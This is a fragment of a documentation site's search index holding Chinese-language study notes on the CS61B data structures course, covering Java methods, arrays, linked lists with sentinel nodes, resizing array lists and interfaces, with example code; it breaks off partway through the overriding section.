<li>\u9759\u6001\u65b9\u6cd5\u662f\u7c7b\u672c\u8eab\u6267\u884c\u7684\u65b9\u6cd5\uff0c\u901a\u8fc7\u7c7b\u540d\u8fdb\u884c\u8c03\u7528</li> <li> <p>\u9759\u6001\u53d8\u91cf: \u662f\u7c7b\u56fa\u6709\u7684\u5c5e\u6027\uff0c\u800c\u4e0d\u5f52\u5c5e\u4e8e\u5b9e\u4f8b <sub> \u5c3d\u91cf\u4e0d\u8981\u4f7f\u7528\u5b9e\u4f8b\u6765\u8bbf\u95ee\u9759\u6001\u53d8\u91cf\uff0c\u901a\u8fc7\u7c7b\u540d\u8bbf\u95ee</sub></p> </li> <li> <p>\u5173\u4e8e<code>main</code>\u65b9\u6cd5</p> </li> <li> <p><code>public</code>: \u5230\u76ee\u524d\u4e3a\u6b62\uff0c\u6211\u4eec\u6240\u6709\u7684\u65b9\u6cd5\u90fd\u4ee5\u8fd9\u4e2a\u5173\u952e\u5b57\u5f00\u5934</p> </li> <li><code>static</code>: \u5b83\u662f\u4e00\u4e2a\u9759\u6001\u65b9\u6cd5\uff0c\u4e0d\u4e0e\u4efb\u4f55\u7279\u5b9a\u5b9e\u4f8b\u5173\u8054</li> <li><code>void</code>: \u5b83\u6ca1\u6709\u8fd4\u56de\u7c7b\u578b</li> <li><code>main</code>: \u8fd9\u662f\u65b9\u6cd5\u7684\u540d\u79f0</li> <li><code>String[] args</code>: \u8fd9\u662f\u4f20\u9012\u7ed9main\u65b9\u6cd5\u7684\u53c2\u6570</li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#22_instance_methods","title":"2.2 \u975e\u9759\u6001\u65b9\u6cd5/\u5b9e\u4f8b\u65b9\u6cd5 <code>Instance Methods</code>","text":"<ol> <li>\u5b9e\u4f8b\u65b9\u6cd5\u4e0d\u5305\u542b<code>static</code>\u5173\u952e\u5b57</li> <li>\u5b9e\u4f8b\u65b9\u6cd5\u9700\u8981\u901a\u8fc7\u4e00\u4e2a\u5df2\u7ecf\u5b9e\u4f8b\u5316\u7684\u5bf9\u8c61<code>object</code>\u6765\u8c03\u7528</li> <li>\u4e00\u65e6\u5bf9\u8c61\u88ab\u5b9e\u4f8b\u5316\uff0c\u5b83\u53ef\u4ee5\u88ab\u8d4b\u503c\u7ed9\u5df2\u58f0\u660e\u7684\u9002\u5f53\u7c7b\u578b\u7684\u53d8\u91cf</li> <li>\u4e00\u4e2a\u7c7b\u7684\u53d8\u91cf<code>variables</code>\u548c\u65b9\u6cd5<code>methods</code>\u4e5f\u79f0\u4e3a\u7c7b\u7684\u6210\u5458<code>member</code></li> <li>\u901a\u8fc7\u70b9\u64cd\u4f5c\u7b26<code>.</code>\u8bbf\u95ee\u7c7b\u7684\u6210\u5458</li> </ol> <pre><code>public class Dog {\n    public int weightInPounds; // \u975e\u9759\u6001\u53d8\u91cf\n\n    public void makeNoise() { // \u5b9e\u4f8b\u65b9\u6cd5\n        if (weightInPounds &lt; 10) {\n            System.out.println(\"yipyipyip!\");\n        } else if (weightInPounds &lt; 30) {\n            System.out.println(\"bark. bark.\");\n        } else {\n            System.out.println(\"woof!\");\n        }\n    }\n}\n</code></pre> <p>\u4f7f\u7528<code>dog</code>\u7c7b\u7684\u793a\u4f8b\u65b9\u6cd5</p> <pre><code>public class DogLauncher {\n    public static void main(String[] args) {\n        Dog d;\n        d = new Dog();\n        d.weightInPounds = 20;\n        d.makeNoise();\n    }\n}\n</code></pre>"},{"location":"cs61b%20notes/w1dsy2ew/#23","title":"2.3 \u6570\u7ec4\u5b9e\u4f8b\u5316\u3001\u5bf9\u8c61\u6570\u7ec4","text":"<ol> <li> <p>\u6570\u7ec4\u5b9e\u4f8b\u5316</p> <pre><code>public class ArrayDemo {\n    public static void main(String[] args) {\n        int[] someArray = new int[5];\n        someArray[0] = 3;\n        someArray[1] = 4;\n    }\n}\n</code></pre> </li> <li> <p>\u5bf9\u8c61\u6570\u7ec4</p> <pre><code>public class DogArrayDemo {\n    public static void main(String[] args) {\n        Dog[] dogs = new Dog[2];\n        dogs[0] = new Dog(8);\n        dogs[1] = new Dog(20);\n        dogs[0].makeNoise();\n    }\n}\n</code></pre> <p>\u6ce8\u610f<code>new</code>\u7684\u4e24\u79cd\u4e0d\u540c\u7528\u6cd5\uff1a\u4e00\u6b21\u7528\u4e8e\u521b\u5efa\u53ef\u4ee5\u5bb9\u7eb3\u4e24\u4e2a<code>Dog</code>\u5bf9\u8c61\u7684\u6570\u7ec4\uff0c\u4e24\u6b21\u7528\u4e8e\u521b\u5efa\u6bcf\u4e2a\u5b9e\u9645\u7684<code>Dog</code></p> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec3_testing","title":"Lec.3 Testing","text":"<ol> <li><code>Step Into</code>: \u6b65\u5165\uff0c\u5728\u8c03\u8bd5\u65f6\u4f1a\u8fdb\u5165\u5230\u65b9\u6cd5\u7684\u5185\u90e8     <code>Step Over</code>: \u6b65\u8fc7\uff0c\u5728\u8c03\u8bd5\u65f6\u4e0d\u4f1a\u8fdb\u5165\u5230\u65b9\u6cd5\u5185\u90e8</li> <li>\u96c6\u6210\u6d4b\u8bd5\uff1a\u9664\u53bb\u5bf9\u4ee3\u7801\u7684\u5355\u5143\u6d4b\u8bd5\uff0c\u9700\u8981\u901a\u8fc7\u96c6\u6210\u6d4b\u8bd5\u786e\u4fdd\u8fd9\u4e9b\u5355\u5143\u80fd\u591f\u6b63\u786e\u7684\u8fdb\u884c\u534f\u540c\u5de5\u4f5c</li> <li><code>Test-Driven-Development (TDD)</code>: \u6d4b\u8bd5\u9a71\u52a8\u5f00\u53d1\uff0c\u5373\u5148\u7f16\u5199\u6d4b\u8bd5\uff0c\u5728\u7f16\u5199\u4ee3\u7801\u672c\u8eab</li> <li>\u786e\u5b9a\u4e00\u4e2a\u65b0\u529f\u80fd</li> <li>\u4e3a\u6b64\u529f\u80fd\u7f16\u5199\u5355\u5143\u6d4b\u8bd5</li> <li>\u8fd0\u884c\u6d4b\u8bd5\uff0c\u5b83\u5e94\u8be5\u4f1a\u5931\u8d25</li> <li>\u7f16\u5199\u901a\u8fc7\u6d4b\u8bd5\u7684\u4ee3\u7801</li> <li>Optional\uff1a\u91cd\u6784\u4ee3\u7801</li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec4_references_recursion_and_lists","title":"Lec.4 References, Recursion, and Lists","text":""},{"location":"cs61b%20notes/w1dsy2ew/#41_primary_types","title":"4.1 Primary Types","text":"<ol> <li><code>Java</code>\u67098\u79cd\u539f\u59cb\u7c7b\u578b\uff0c\u5206\u522b\u662f<code>byte</code>, <code>short</code>, <code>int</code>, <code>long</code>, <code>float</code>, <code>double</code>, <code>boolean</code>, <code>char</code> Java\u4e0d\u521d\u59cb\u5316\u53d8\u91cf\uff0c\u4ee5\u4fdd\u8bc1\u5b89\u5168</li> <li>\u901a\u8fc7\u4e00\u4e2a\u53d8\u91cf\u5411\u53e6\u4e00\u4e2a\u53d8\u91cf\u4f7f\u7528<code>=</code>\u8fdb\u884c\u8d4b\u503c\u65f6\uff0c\u662f\u5c06\u4e00\u4e2a\u53d8\u91cf\u4ee3\u8868\u7684\u6570\u636e\u5757\u4e2d\u7684\u4f4d <code>bits</code>\u8d4b\u7ed9\u4e86\u53e6\u4e00\u4e2a\u53d8\u91cf</li> <li>\u8fdb\u884c\u53c2\u6570\u4f20\u9012\u65f6\u4e5f\u662f\u590d\u5236\u4f4dbits</li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#42_reference_types","title":"4.2 Reference Types","text":"<ol> <li>\u9664\u4e86\u539f\u59cb\u7c7b\u578b\u4e4b\u5916\u7684\u6240\u6709\u7c7b\u578b\uff0c\u90fd\u662f\u5f15\u7528\u7c7b\u578b</li> <li>\u5728\u58f0\u660e\u7279\u5b9a\u7c7b\u578b\u53d8\u91cf\u7684\u65f6\u5019\uff0c<code>Java</code>\u4f1a\u627e\u5230\u8fde\u7eed\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u6b63\u597d\u5bb9\u7eb3\u8be5\u7c7b\u578b\u7684\u4e00\u4e2a\u4e8b\u7269; \u5e76\u4e14\u4f1a\u5728\u5185\u90e8\u521b\u5efa\u4e00\u4e2a\u6761\u76ee\uff0c\u5c06\u6bcf\u4e2a\u53d8\u91cf\u540d\u6620\u5c04\u5230\u4f4d\u76d2\u4e2d\u7684\u7b2c\u4e00\u4e2a\u4f4d\u7684\u4f4d\u7f6e     <code>Java</code>\u4e0d\u5141\u8bb8\u76f4\u63a5\u627e\u5230\u6570\u636e\u50a8\u5b58\u7684\u4f4d\u7f6e (\u4e0eC\u8bed\u8a00\u4e0d\u540c)</li> <li>\u5f53\u5b9e\u4f8b\u5316\u4e00\u4e2a\u5bf9\u8c61\u65f6\uff0c\u7f16\u8bd1\u5668\u5728\u5206\u914d\u597d\u7a7a\u95f4\u4e4b\u540e\u4f1a\u9ed8\u8ba4\u7684\u5411\u91cc\u9762\u586b\u5145\u8fdb\u9ed8\u8ba4\u503c     (e.g. <code>0</code> <code>null</code>)     \u968f\u540e\u6784\u9020\u5668constructor\u5411\u91cc\u9762\u586b\u5145\u5176\u5b83\u503c</li> <li>\u53ef\u4ee5\u628anew\u7406\u89e3\u4e3a\u8fd4\u56de\u4e86\u7279\u5b9a\u7c7b\u5b9e\u4f8b\u768464\u4f4d\u5730\u5740</li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#43_instantation_of_arrays","title":"4.3 Instantation of Arrays","text":"<ol> <li> <p>\u6570\u7ec4\u7684\u58f0\u660e\uff1a</p> <pre><code>int[] x;\nPlanet[] planets;\n</code></pre> <p>\u4e24\u4e2a\u58f0\u660e\u90fd\u521b\u5efa\u4e8664\u4f4d\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u7528\u6765\u4fdd\u5b58\u5206\u914d\u7684\u6570\u7ec4\u7a7a\u95f4\u7684\u5730\u5740 2. \u6570\u7ec4\u7684\u5b9e\u4f8b\u5316</p> <pre><code>x = new int[]{0, 1, 2, 95, 4};\n</code></pre> <p><code>new</code>\u5173\u952e\u5b57\u521b\u5efa\u4e865\u4e2a\u6bcf\u4e2a32\u4f4d\u7684\u8fde\u7eed\u7684\u5185\u5b58\u7a7a\u95f4\uff0c\u5e76\u5c06\u6574\u4f53\u5bf9\u8c61\u7684\u5730\u5740\u8fd4\u56de\u4ee5\u5206\u914d\u7ed9x</p> </li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#44_intlist_and_linked_data_structures","title":"4.4 IntList and Linked Data Structures","text":"<p>Reference to <code>Classcode/Lec4_Reference_Recursion_and_Lists</code></p>"},{"location":"cs61b%20notes/w1dsy2ew/#lec5_sllists_nested_classes_and_sentinel_nodes","title":"Lec.5 SLLists, Nested Classes and Sentinel Nodes","text":"<ol> <li> <p>\u5b9a\u4e49\u8282\u70b9</p> <pre><code>public class IntNode {\n    public int item;\n    public IntNode next;\n\n    public IntNode(int i, IntNode n) {\n        item = i;\n        next = n;\n    }\n}\n</code></pre> </li> <li> <p>\u521b\u5efa\u4e00\u4e2aSLList\u7684\u5355\u72ec\u7c7b (user will interact with)</p> <pre><code>public class SLList {\n    private IntNode first;\n// \u4f7ffirst\u65e0\u6cd5\u76f4\u63a5\u4ece\u5916\u90e8\u8bbf\u95ee\n    public SLList(int x) {\n        first = new IntNode(x, null);\n    }\n}\n</code></pre> </li> <li> <p>\u4e0e<code>IntList</code>\u5b9a\u4e49\u4e00\u4e2a\u65b0\u94fe\u8868\u65f6\u7684\u5bf9\u6bd4</p> <pre><code>IntList L1 = new IntList(5, null);\nSLList L2  = new SLList(5);\n</code></pre> <p>\u9690\u85cf\u4e86\u7a7a\u6307\u9488<code>null</code>\u7684\u7ec6\u8282 3. <code>addFirst</code>\u4ee5\u53ca<code>getFirst</code>\u65b9\u6cd5</p> <pre><code>/** Adds an item to the front of the list. */\npublic void addFirst(int x) {\n    first = new IntNode(x, first);\n}\n\n/** Retrieves the front item from the list. */\npublic int getFirst() {\n    return first.item;\n}\n</code></pre> <ul> <li>\u76f8\u5bf9\u4e8e<code>IntList</code>\u907f\u514d\u4e86\u663e\u5f0f\u7684<code>new</code>\u5173\u952e\u5b57\u7684\u4f7f\u7528</li> </ul> </li> <li> <p>\u5d4c\u5957\u7c7b <code>Nested Classes</code>     \u5d4c\u5957\u7c7b\u5bf9\u4ee3\u7801\u6ca1\u6709\u6709\u610f\u4e49\u7684\u5f71\u54cd\uff0c\u53ea\u662f\u4e3a\u4e86\u4ee3\u7801\u7684\u76f4\u89c2</p> <pre><code>public class SLList {\n    public class IntNode {\n            public int item;\n            public IntNode next;\n            public IntNode(int i, IntNode n) {\n                item = i;\n                next = n;\n            }\n    }\n\n    private IntNode first; \n\n    public SLList(int x) {\n        first = new IntNode(x, null);\n    } \n\u00b7\u00b7\u00b7\n}\n</code></pre> <ul> <li>\u5982\u679c\u5d4c\u5957\u7c7b\u4e0d\u9700\u8981\u4f7f\u7528<code>SLList</code>\u7684\u4efb\u4f55\u65b9\u6cd5\u6216\u8005\u53d8\u91cf\uff0c\u5219\u53ef\u4ee5\u5c06\u5176\u58f0\u660e\u4e3a<code>static</code>\uff0c\u610f\u5473\u7740\u9759\u6001\u7c7b\u4e2d\u7684\u65b9\u6cd5\u4e0d\u80fd\u8bbf\u95ee\u5c01\u95ed\u7c7b\u7684\u4efb\u4f55\u6210\u5458</li> <li>\u8fd9\u53ef\u4ee5\u8282\u7701\u5185\u5b58\uff0c\u56e0\u4e3a\u6bcf\u4e2a<code>IntNode</code>\u4e0d\u518d\u9700\u8981\u77e5\u9053\u5982\u4f55\u8bbf\u95ee\u5176\u5c01\u95ed\u7684<code>SLList</code></li> </ul> </li> <li> <p><code>addLast</code>\u548c<code>size</code>\u65b9\u6cd5</p> <pre><code>/** \u5728\u5217\u8868\u672b\u5c3e\u6dfb\u52a0\u4e00\u4e2a\u9879\u76ee\u3002 */\npublic void addLast(int x) {\n    IntNode p = first;\n\n    /* \u5c06p\u63a8\u8fdb\u5230\u5217\u8868\u672b\u5c3e\u3002 */\n    while (p.next != null) {\n        p = p.next;\n    }\n    p.next = new IntNode(x, null);\n}\n\n/** \u4eceIntNode p\u5f00\u59cb\u8fd4\u56de\u5217\u8868\u7684\u5927\u5c0f\u3002 */\nprivate static int size(IntNode p) {\n    if (p.next == null) {\n        return 1;\n    }\n\n    return 1 + size(p.next);\n}\n\npublic int size() {\n    return size(first);\n}\n</code></pre> <ul> <li>\u6b64\u5904\u6709\u4e24\u4e2a<code>size</code>\u65b9\u6cd5\uff0c\u5177\u6709\u76f8\u540c\u540d\u79f0\u4f46\u4e0d\u540c\u51fd\u6570\u7b7e\u540d\u7684\u4e24\u4e2a\u65b9\u6cd5\u662f\u91cd\u8f7d\u7684</li> </ul> </li> <li> <p>\u5bf9<code>size</code>\u7684\u6539\u8fdb</p> </li> <li> <p>\u91cd\u5199<code>size</code>\u65b9\u6cd5</p> </li> </ol> <pre><code>public class SLList {\n    ... /* IntNode\u58f0\u660e\u7701\u7565\u3002 */\n    private IntNode first;\n    private int size;\n\n    public SLList(int x) {\n        first = new IntNode(x, null);\n        size = 1;\n    }\n\n    public void addFirst(int x) {\n        first = new IntNode(x, first);\n        size += 1;\n    }\n\n    public int size() {\n        return size;\n    }\n    ...\n}\n</code></pre> <ul> <li> <p>\u8fd9\u79cd\u5c06\u91cd\u8981\u6570\u636e\u7f13\u5b58\u4ee5\u63d0\u9ad8\u68c0\u7d22\u901f\u5ea6\u7684\u505a\u6cd5\u79f0\u4e3a\u7f13\u5b58</p> </li> <li> <p>\u521b\u5efa\u7a7a\u5217\u8868</p> <pre><code>public SLList() {\n    first = null;\n    size = 0;\n}\n</code></pre> <ul> <li>\u4fee\u590d<code>addLast</code>\u65b9\u6cd5\u4ee5\u9632\u6b62\u5176\u5411\u7a7a\u5217\u8868\u63d2\u5165\u65f6\u5d29\u6e83</li> </ul> <pre><code>public void addLast(int x) {\n    size += 1;\n    IntNode p = sentinel;\n    while (p.next != null) {\n        p = p.next;\n    }\n\n    p.next = new IntNode(x, null);\n}\n</code></pre> </li> <li> <p>\u4e0d\u53d8\u91cf\u662f\u6570\u636e\u7ed3\u6784\u4e2d\u603b\u662f\u6210\u7acb\u7684\u4e00\u4e2a\u4e8b\u5b9e     \u5e26\u6709\u54e8\u5175\u8282\u70b9\u7684SLList\u81f3\u5c11\u6709\u4ee5\u4e0b\u4e0d\u53d8\u91cf\uff1a         - sentinel\u5f15\u7528\u59cb\u7ec8\u6307\u5411\u4e00\u4e2a\u54e8\u5175\u8282\u70b9         - \u5982\u679c\u5b58\u5728\u524d\u9879\uff0c\u5219\u59cb\u7ec8\u5728sentinel.next.item         - size\u53d8\u91cf\u59cb\u7ec8\u662f\u5df2\u6dfb\u52a0\u9879\u76ee\u7684\u603b\u6570</p> </li> </ul>"},{"location":"cs61b%20notes/w1dsy2ew/#lec6_dllist_and_arrays","title":"Lec.6 DLList and Arrays","text":""},{"location":"cs61b%20notes/w1dsy2ew/#61_dllist","title":"6.1 DLList","text":"<ol> <li>Sentinel Nodes\uff1a\u5c06\u53cc\u5411\u94fe\u8868\u7684\u7b2c\u4e00\u4e2a\u8282\u70b9\u548c\u6700\u540e\u4e00\u4e2a\u8282\u70b9\u5206\u522b\u7531\u54e8\u5175\u8282\u70b9\u7684<code>next</code>\u548c<code>prev</code>\u6307\u5411</li> <li> <p>Generic DLList\uff1a\u6cdb\u578b\u53cc\u5411\u94fe\u8868\uff0c\u5141\u8bb8\u5305\u542b\u4efb\u4f55\u5f15\u7528\u7c7b\u578b</p> </li> <li> <p>\u5728\u5b9e\u73b0\u6570\u636e\u7ed3\u6784\u7684.java\u6587\u4ef6\u4e2d\uff0c\u53ea\u5728\u6587\u4ef6\u9876\u90e8\u7684\u7c7b\u540d\u540e\u6307\u5b9a\u6cdb\u578b\u7c7b\u578b\u540d\u79f0\u4e00\u6b21</p> </li> </ol> <pre><code>public class DLList&lt;BleepBlorp&gt; {\n    private IntNode sentinel;\n    private int size;\n\n    public class IntNode {\n        public IntNode prev;\n        public BleepBlorp item;\n        public IntNode next;\n        ...\n    }\n    ...\n}\n</code></pre> <ul> <li><code>BleepBlorp</code>\u53ef\u4ee5\u7528\u5176\u4ed6\u540d\u5b57\u4ee3\u66ff</li> <li>\u5728\u58f0\u660e\u671f\u95f4\u5c06\u76f8\u5e94\u7684\u5f15\u7528\u7c7b\u578b\u653e\u5728\u5c16\u62ec\u53f7<code>&lt;&gt;</code>\u5185\uff0c\u5e76\u5728\u5b9e\u4f8b\u5316\u671f\u95f4\u4f7f\u7528\u7a7a\u5c16\u62ec\u53f7<code>&lt;&gt;</code></li> </ul> <pre><code>DLList&lt;String&gt; d2 = new DLList&lt;&gt;(\"hello\");\nd2.addLast(\"world\");\n</code></pre> <ul> <li>\u5982\u679c\u9700\u8981\u5bf9\u539f\u59cb\u7c7b\u578b\u8fdb\u884c\u6cdb\u578b\u5b9e\u4f8b\u5316\uff0c\u8bf7\u4f7f\u7528<code>Integer</code>\u3001<code>Double</code>\u3001<code>Character</code>\u3001<code>Boolean</code>\u3001<code>Long</code>\u3001<code>Short</code>\u3001<code>Byte</code>\u6216<code>Float</code>\u4ee3\u66ff\u5b83\u4eec\u7684\u539f\u59cb\u7b49\u4ef7\u7269</li> </ul> <pre><code>DLList&lt;Integer&gt; d1 = new DLList&lt;&gt;(5);\nd1.insertFront(10);\n\n/* \u4f46\u662f\u5728\u5b9e\u4f8b\u5316\u65f6\u5728\u5c16\u62ec\u53f7\u4e2d\u52a0\u4e0a\u6570\u636e\u7c7b\u578b\u4e5f\u53ef\u4ee5\uff0c\u5c3d\u7ba1\u6709\u4e9b\u591a\u4f59 */\nDLList&lt;Integer&gt; d1 = new DLList&lt;Integer&gt;(5);\n</code></pre>"},{"location":"cs61b%20notes/w1dsy2ew/#62_array","title":"6.2 Array","text":"<ol> <li> <p>\u6570\u7ec4\u7684\u521b\u5efa</p> <pre><code>x = new int[3];\ny = new int[]{1, 2, 3, 4, 5};\nint[] z = {9, 10, 11, 12, 13};\n</code></pre> <ul> <li><code>x</code>: \u521b\u5efa\u4e00\u4e2a\u957f\u5ea6\u4e3a3\u7684\u6570\u7ec4\uff0c\u5e76\u7528\u9ed8\u8ba4\u7684<code>int</code>\u503c<code>0</code>\u586b\u5145</li> <li><code>y</code>: \u521b\u5efa\u4e86\u4e00\u4e2a\u957f\u5ea6\u4e3a5\u7684\u6570\u7ec4\uff0c\u5305\u542b\u8fd9\u4e94\u4e2a\u7279\u5b9a\u5143\u7d20</li> <li><code>z</code>: \u4e0e\u524d\u8005\u6709\u76f8\u540c\u7684\u884c\u4e3a\uff0c\u7701\u7565\u4e86<code>new</code>\u5173\u952e\u5b57\u7684\u4f7f\u7528</li> </ul> </li> <li> <p><code>arraycopy</code>\u65b9\u6cd5</p> <pre><code>System.arraycopy(b, 0, x, 3, 2);\n</code></pre> <p><code>System.arraycopy</code>\u9700\u8981\u4e94\u4e2a\u53c2\u6570\uff1a</p> <ul> <li>\u4f5c\u4e3a\u6e90\u7684\u6570\u7ec4</li> <li>\u6e90\u6570\u7ec4\u4e2d\u7684\u8d77\u59cb\u4f4d\u7f6e</li> <li>\u4f5c\u4e3a\u76ee\u6807\u7684\u6570\u7ec4</li> <li>\u76ee\u6807\u6570\u7ec4\u4e2d\u7684\u8d77\u59cb\u4f4d\u7f6e</li> <li>\u8981\u590d\u5236\u7684\u9879\u76ee\u6570\u91cf \u7b49\u540c\u4e8e<code>python</code>\u4e2d\u7684<code>x[3:5] = b[0:2]</code></li> </ul> </li> <li> <p><code>java</code>\u4e2d\u7684\u4e8c\u7ef4\u6570\u7ec4\uff1a\u5b9e\u8d28\u4e0a\u662f\u6570\u7ec4\u7684\u6570\u7ec4</p> <pre><code>int[][] pascalsTriangle;\npascalsTriangle = new int[4][];\nint[] rowZero = pascalsTriangle[0];\n\npascalsTriangle[0] = new int[]{1};\npascalsTriangle[1] = new int[]{1, 1};\npascalsTriangle[2] = new int[]{1, 2, 1};\npascalsTriangle[3] = new int[]{1, 3, 3, 1};\nint[] rowTwo = pascalsTriangle[2];\nrowTwo[1] = -5;\n\nint[][] matrix;\nmatrix = new int[4][]; \n// Java allows you to create an \n// array of arrays in two steps.\nmatrix = new int[4][4]; \n// Now, each array in the matrix array \n// has been initialized to length 4.\n\nint[][] pascalAgain = new int[][]{{1}, {1, 1}, \n                                {1, 2, 1}, {1, 3, 3, 1}};\n</code></pre> </li> <li> <p>\u6570\u7ec4\u4e0e\u7c7b</p> </li> <li> <p>\u6570\u7ec4\u7684\u5185\u5b58\u662f\u7f16\u53f7\u7684\uff0c\u4f7f\u7528<code>[]</code>\u8bbf\u95ee\uff0c\u7c7b\u7684\u5185\u5b58\u7a7a\u95f4\u662f\u547d\u540d\u7684\uff0c\u4f7f\u7528<code>.</code>\u64cd\u4f5c\u7b26\u8bbf\u95ee</p> </li> <li>\u6570\u7ec4\u50a8\u5b58\u7684\u6570\u636e\u5fc5\u987b\u662f\u76f8\u540c\u7c7b\u578b\uff0c\u800c\u7c7b\u53ef\u4ee5\u662f\u4e0d\u540c\u7c7b\u578b</li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec7_alists_resizing_vs_slists","title":"Lec.7 ALists, Resizing, vs. SLists","text":"<ol> <li>\u5bf9<code>AList</code>\u7684\u57fa\u672c\u8868\u793a</li> </ol> <pre><code>public class AList {\n   private int[] items;\n   private int size;\n\n   public AList() {\n       items = new int[100];  size = 0;\n   }\n\n   public void addLast(int x) {\n       items[size] = x;\n       size += 1;\n   }\n\n   public int getLast() {\n       return items[size - 1];\n   }\n\n   public int get(int i) {\n       return items[i];\n   }\n\n   public int size() {\n       return size;\n   }\n}\n</code></pre> <ol> <li> <p>AList Invariants\u4e0d\u53d8\u91cf\uff1a</p> </li> <li> <p>\u8981\u63d2\u5165\u7684\u4e0b\u4e00\u4e2a\u9879\u76ee\u7684\u4f4d\u7f6e\u59cb\u7ec8\u662f<code>size</code></p> </li> <li><code>size</code>\u59cb\u7ec8\u662f<code>AList</code>\u4e2d\u7684\u9879\u76ee\u6570\u91cf</li> <li> <p>\u5217\u8868\u4e2d\u7684\u6700\u540e\u4e00\u4e2a\u9879\u76ee\u59cb\u7ec8\u4f4d\u4e8e\u4f4d\u7f6e<code>size - 1</code></p> </li> <li> <p>Geometric Resizing \u4ee5\u51e0\u4f55\u7ea7\u6570\u52a8\u6001\u8c03\u6574\u6570\u7ec4\u5927\u5c0f</p> </li> <li> <p>\u76f8\u5bf9\u4e0e<code>+</code>\uff0c<code>*</code>\u5bf9\u589e\u6dfb\u5143\u7d20\u7684\u6548\u7387\u66f4\u9ad8 (\u663e\u800c\u6613\u89c1)</p> </li> </ol> <pre><code>public void insertBack(int x) {\n    if (size == items.length) {\n           resize(size * RFACTOR);\n    }\n    items[size] = x;\n    size += 1;\n}\n</code></pre> <ol> <li> <p>Memory Performance\uff1a</p> </li> <li> <p>\u4e0a\u9762\u7684\u65b9\u6cd5\u4f1a\u5bfc\u81f4\u5220\u9664\u6570\u636e\u540e\u5927\u91cf\u7a7a\u95f4\u88ab\u6d6a\u8d39</p> </li> <li> <p>\u53ef\u4ee5\u989d\u5916\u5b9a\u4e49\u4e00\u4e2a<code>\"usage ratio\" R</code>\uff0c\u5176\u5927\u5c0f\u7b49\u4e8e\u5217\u8868\u7684\u5927\u5c0f\u9664\u4ee5\u6570\u7ec4\u7684\u957f\u5ea6\uff0c\u5f53<code>R</code>\u5c0f\u4e8e\u67d0\u4e2a\u503c\u65f6(e.g. 0.25)\uff0c\u6570\u7ec4\u957f\u5ea6\u51cf\u5c0f(e.g. \u53d8\u4e3a\u539f\u6765\u7684\u4e8c\u5206\u4e4b\u4e00)</p> </li> <li> <p>Generic ALists\u6cdb\u5316\u6570\u7ec4\u5217\u8868</p> </li> <li> <p><code>Java</code>\u4e0d\u5141\u8bb8\u521b\u5efa\u6cdb\u578b\u5bf9\u8c61\u6570\u7ec4</p> </li> </ol> <pre><code>Glorp[] items = new Glorp[8]; // \u9519\u8bef\uff01\n\nGlorp[] items = (Glorp []) new Object[8]; // \u6b63\u786e\uff01\n</code></pre> <ol> <li>\u5bf9\u4e8e\u5220\u9664\u7684\u9879\uff0c\u8981\u624b\u52a8\u5c06\u5176\u53d8\u4e3a<code>null</code>\uff0c\u56e0\u4e3a\u6b64\u65f6\u5f15\u7528\u4ecd\u7136\u5b58\u5728\uff0c<code>java</code>\u4e0d\u4f1a\u81ea\u52a8\u5bf9\u6dfb\u52a0\u5230\u5217\u8868\u7684\u5bf9\u8c61\u8fdb\u884c\u56de\u6536</li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#lec8_interface_and_implementation_inheritance","title":"Lec.8 Interface and Implementation Inheritance","text":""},{"location":"cs61b%20notes/w1dsy2ew/#81_hypernyms_hyponyms_and_interface_inheritance","title":"8.1 Hypernyms, Hyponyms, and Interface Inheritance","text":"<ol> <li> <p>\u4e0a\u4f4d\u8bcd<code>Hypernyms</code>\u548c<code>Hyponyms</code>\u6784\u6210\u4e86\u4e00\u79cd\u5c42\u6b21\u7ed3\u6784<code>Hierarchy</code></p> </li> <li> <p>List is a hypernym of SLList and AList</p> </li> <li> <p><code>java</code>\u4e2d\u901a\u8fc7\u4e24\u6b65\u8868\u8fbe\u8fd9\u4e00\u8fc7\u7a0b</p> <ul> <li>\u4e3a\u4e0a\u4f4d\u8bcd\u5b9a\u4e49\u4e00\u4e2a\u5f15\u7528\u7c7b\u578b<code>List61B.java</code></li> <li>\u6307\u5b9a<code>SLList</code>\u548c<code>AList</code>\u662f\u8be5\u7c7b\u578b\u7684\u4e0b\u4f4d\u8bcd</li> </ul> </li> <li> <p>\u4f7f\u7528\u5173\u952e\u8bcd<code>interface</code>\u6765\u5b9a\u4e49<code>List61B</code></p> </li> <li> <p>\u8fd9\u4e2a\u201c\u63a5\u53e3\u201d\u5b9a\u4e49\u5217\u8868\u80fd\u5b9e\u73b0\u4ec0\u4e48<code>what</code>\uff0c\u4f46\u4e0d\u5173\u5fc3\u5217\u8868\u7684\u5b9e\u73b0\u65b9\u5f0f<code>how</code></p> </li> </ol> <pre><code>public interface List61B&lt;Item&gt; {\n    public void addFirst (Item x);\n    public void getFirst ();\n    public Item get (int i);\n    ...\n}\n</code></pre> <ul> <li>\u6539\u8fdb\u8fc7\u540e\u7684\u5176\u4ed6\u51fd\u6570\u5219\u53ef\u53d8\u4e3a</li> </ul> <pre><code>public static String longest (List61B&lt;String&gt; list);\n</code></pre> <ol> <li>\u5b50\u7c7b\u5fc5\u987b\u8986\u76d6\u5728\u63a5\u53e3\u4e2d\u58f0\u660e\u7684\u6240\u6709\u65b9\u6cd5</li> </ol>"},{"location":"cs61b%20notes/w1dsy2ew/#82_overloading_and_overriding","title":"8.2 Overloading and Overriding","text":"<ol> <li> <p>Defination</p> </li> <li> <p><code>Overloading</code>: \u540c\u4e00\u4e2a\u7c7b\u4e2d\u53ef\u4ee5\u6709\u591a\u4e2a\u76f8\u540c\u540d\u5b57\u7684\u65b9\u6cd5\uff0c\u53ea\u8981\u5b83\u4eec\u7684\u51fd\u6570\u7b7e\u540d\u4e0d\u540c\u5373\u53ef\u4e0e\u7ee7\u627f\u65e0\u5173</p> </li> <li> <p><code>Overriding</code>: 